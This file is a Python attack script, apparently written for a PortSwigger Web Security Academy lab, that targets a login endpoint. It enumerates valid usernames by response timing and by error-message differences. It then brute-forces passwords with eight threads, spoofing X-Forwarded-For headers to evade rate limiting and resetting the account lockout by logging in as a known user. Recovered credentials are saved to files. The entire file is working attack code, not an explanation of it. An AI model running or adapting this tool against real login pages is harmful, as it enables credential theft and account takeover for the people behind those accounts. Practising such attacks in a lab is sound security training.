from random import random
import requests
import html
import random
from threading import Thread
import time
import os.path


def getHeader(iter):
    return {'content-type': 'application/x-www-form-urlencoded', 'Accept-Charset': 'UTF-8',  'X-Forwarded-For':str(iter)}

url = 'https://0ace006a034b9bf8c0300bbf00bd00b2.web-security-academy.net/login'
defaultCookies = { 
    "session":"wSn2za9qJGQPGAc2wcjiKh9kIFrmc7hM"
}

def getUserPayload(name):
    return {
        "username": str(name),
        "password": "x"*1000
    }

def getPasswordPayload(name, password):
     return {
        "username": str(name),
        "password": str(password)
    }

def getUsername():
    with open('userList.txt') as file:
        
        for line in file:
            ranNum = random.randint(1, 1000)
            user = line.rstrip()
            payload = getUserPayload(user)

            r = requests.post(url, data=payload, headers=getHeader(ranNum), cookies=defaultCookies)
            print('Probando con: %s' % (user))
            if(r.elapsed.total_seconds() > 4):
                print('el usuario es correcto: %s' % (user))
                f = open('index.html', 'w')
                f.write(html.unescape(r.text))
                f.close()
                break

def resetBlock():
    data = {
        "username":"wiener",
        "password":"peter",
    }
    requests.post(url, data=data, headers=getHeader(1), cookies=defaultCookies)

def divideList(my_list, numTasks):
    listOfWordlists = []
    for i in range(numTasks):
        listOfWordlists.append(my_list[i::numTasks])

    return listOfWordlists

def getUsername(userList):
    password = '123'
    userFound = False
    for user in userList:
        ranNum = random.randint(1, 1000)
        payload = getPasswordPayload(user, password)

        print('Probando con: %s' % (user))
        for i in range(5):
            r = requests.post(url, data=payload, headers=getHeader(ranNum), cookies=defaultCookies)
            print('Intento de %s # %s' % (user, i))
            if(not ("<p class=is-warning>Invalid username or password.</p>" in r.text) ):
                #Imprimir respuesta HTML
                f = open('index.html', 'w')
                f.write(html.unescape(r.text))
                f.close()

                #Guardar resultado de usuario en texto
                f = open('resultado.txt', 'w')
                f.write('el usuario es correcto: %s' % (user))
                f.close()

                print('el usuario es correcto: %s' % (user))
                userFound = True
                break
        
        if(userFound):
            break

def getPassword(passwordsList, user):
    resetBlock()
    for password in passwordsList:
        ranNum = random.randint(1, 1000)
        payload = getPasswordPayload(user, password)

        r = requests.post(url, data=payload, headers=getHeader(ranNum), cookies=defaultCookies)
        print('Probando con: %s' % (password))
        if( "You have made too many incorrect login attempts" in r.text ):
            print('Bloqueo de cuenta: esperando...')
        elif(not ("<p class=is-warning>Invalid username or password.</p>" in r.text) ):
            f = open('index.html', 'w')
            f.write(html.unescape(r.text))
            f.close()

            #Guardar resultado de usuario en texto
            f = open('resultadoPwd.txt', 'w')
            f.write('el usuario es correcto: %s\n' % (user))
            f.write('La contraseña es: %s' % (password))
            f.close()

            print('el usuario es correcto: %s' % (user))
            print('La contraseña es: %s' % (password))
            break
        resetBlock()

def test(list):
    print(list)

def main_getuser(numTasks):
    file = open('userList.txt')
    lines = file.read().splitlines()    
    file.close()
    listOfWordlists = divideList(lines,numTasks)
    for i in range(numTasks):
        task = Thread(target=getUsername, args=[listOfWordlists[i]])
        task.daemon = True
        task.start()

    while True:
        time.sleep(1)
        f = open('resultado.txt')
        result = f.read()
        f.close() 
        if (result != ''):
            break

def main_getPassword(numTasks, user):
    file = open('pwdList.txt')
    lines = file.read().splitlines()    
    file.close()
    listOfWordlists = divideList(lines,numTasks)
    for i in range(numTasks):
        task = Thread(target=getPassword, args=[listOfWordlists[i], user])
        task.daemon = True
        task.start()

    while True:
        time.sleep(1)
        
        if(os.path.exists('resultadoPwd.txt')):
            f = open('resultadoPwd.txt')
            result = f.read()
            f.close() 
            if (result != ''):
                break

#main_getuser(8)
#ao


main_getPassword(8,'ao')

